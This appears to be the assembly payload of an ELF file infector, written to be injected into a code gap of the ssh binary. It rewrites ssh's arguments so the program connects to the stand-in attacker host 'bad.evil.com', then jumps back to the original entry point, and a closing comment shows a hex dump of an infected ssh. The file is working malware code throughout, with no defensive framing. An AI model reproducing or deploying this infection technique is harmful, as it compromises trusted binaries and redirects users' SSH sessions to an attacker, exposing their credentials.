.intel_syntax noprefix


PING:
	#; this is why the SHORTCALLZ is used in the infector.c - gap_offset will be moved forward by this 5-byte instruction
	call short PONG
PONG:
	#; get rip (gap_offset after 5-byte call from above) - call above is a clever way to grab rip
	pop rbx

	#; get base
	mov rbp, rsp

	#; set up strings
	#; ssh bad.evil.com

	mov rdi, 0x000000006d6f632e	#; .com\0
	push rdi
	mov rdi, 0x6c6976652e646162	#; bad.evil
	push rdi
	lea rdi, [rsp]

	#; setup env
	push rcx			#; NULL
	#; setup argv
	push rcx			#; NULL
	push rdi			#; [1] = "bad.evil.com"

	mov rsi, [rbp + 0x8]
	push rsi			#; [0] = "ssh"
	#; setup argc
	mov rdi, 0x2
	push rdi			#; number of items in argv array

END:
	#; get original entry ptr
	mov rcx, 0x4141414141414141	#; placeholder for infector.c to find/replace with offset needed to get back to original entry
	add rbx, rcx			#; rbx = 0x7369a + (-0x62baa) == 0x10af0
	jmp rbx

#; xxd -s +0x73695 ssh | less == output of the ssh program AFTER infection (0x73695 == 'gap_offset' in infector.c)
#; 00073695: e800 0000 005b 4889 e548 c7c7 2e63 6f6d  .....[H..H...com
#000736a5: 5748 bf62 6164 2e65 7669 6c57 488d 3c24  WH.bad.evilWH.<$
#000736b5: 5151 5748 8b75 0856 48c7 c702 0000 0057  QQWH.u.VH......W
#000736c5: 48b9 56d4 f9ff ffff ffff 4801 cbff e300  H.V.......H.....
#000736d5: 0000 0000 0000 0000 0000 0000 0000 0000  ................
#000736e5: 0000 0000 0000 0000 0000 0000 0000 0000  ................

